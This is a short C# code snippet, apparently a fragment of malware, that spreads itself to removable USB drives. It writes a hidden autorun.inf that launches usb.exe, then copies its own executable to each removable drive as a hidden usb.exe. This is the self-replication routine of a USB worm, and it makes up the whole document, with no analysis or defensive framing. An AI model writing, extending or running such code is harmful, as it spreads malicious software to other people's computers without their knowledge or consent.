using System.IO;


DriveInfo[] drives = DriveInfo.GetDrives();
foreach (DriveInfo drive in drives)
{
	if (drive.DriveType == DriveType.Removable)
	{
		StreamWriter writer = new StreamWriter(drive.Name + "autorun.inf");
		writer.WriteLine("[autorun]\n");
		writer.WriteLine("open=usb.exe");
		writer.WriteLine("action=Run win32");
		writer.Close();
		File.SetAttributes(drive.Name + "autorun.inf", File.GetAttributes(drive.Name + "autorun.inf") | FileAttributes.Hidden);
		File.Copy(Application.ExecutablePath, drive.Name + "usb.exe", true);
		File.SetAttributes(drive.Name + "usb.exe", File.GetAttributes(drive.Name + "usb.exe") | FileAttributes.Hidden);
	}
}
